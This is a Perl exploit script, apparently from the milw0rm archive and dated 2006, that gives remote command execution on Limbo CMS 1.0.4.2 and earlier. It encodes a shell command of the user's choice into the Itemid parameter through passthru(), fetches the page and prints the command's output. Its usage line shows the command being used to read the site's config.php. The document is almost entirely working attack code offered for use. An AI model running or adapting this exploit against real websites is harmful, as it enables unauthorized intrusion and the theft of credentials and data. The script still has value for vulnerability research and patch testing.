<html><head><title>Limbo CMS <= 1.0.4.2 (ItemID) Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl
##
## Limbo CMS &lt;= 1.0.4.2 (ItemID) Remote Code Execution Exploit
## Bug Discovered by: Coloss / Epsilon (advance1[at]gmail.com) http://coded.altervista.org/limbophp.pl
## /str0ke (milw0rm.com)

use LWP::Simple;

$serv     =  $ARGV[0];
$path     =  $ARGV[1];
$command  =  $ARGV[2];
$cmd      =  &quot;echo start_er;&quot;.
             &quot;$command;&quot;.
             &quot;echo end_er&quot;;

my $byte = join('.', map { $_ = 'chr('.$_.')' } unpack('C*', $cmd));

sub usage
{
        print &quot;Limbo CMS &lt;= 1.0.4.2 (ItemID) Remote Code Execution Exploit /str0ke (milw0rm.com)&quot;;
        print &quot;Usage: $0 www.example.com /directory/ \&quot;cat config.php\&quot;\n&quot;;
        print &quot;sever    -  URL\n&quot;;
        print &quot;path     -  path to limbo\n&quot;;
        print &quot;command  -  command to execute\n&quot;;
        exit ();
}

sub exploit
{
        print qq(Limbo CMS &lt;= 1.0.4.2 (ItemID) Remote Code Execution Exploit\n/str0ke (milw0rm.com)\n\n);
        $URL = sprintf(&quot;http://%s%sindex.php?option=frontpage&amp;Itemid=passthru($byte)&quot;,$serv,$path);
        my $content = get &quot;$URL&quot;;
        if ($content =~ m/start_er(.*?)end_er/ms) {
                my $out = $1;
                $out =~ s/^\s+|\s+$//gs;
                if ($out) {
                        print &quot;$out\n&quot;;
                }
        }
}

if (@ARGV != 3){&amp;usage;}else{&amp;exploit;}

# milw0rm.com [2006-03-01]</pre></html>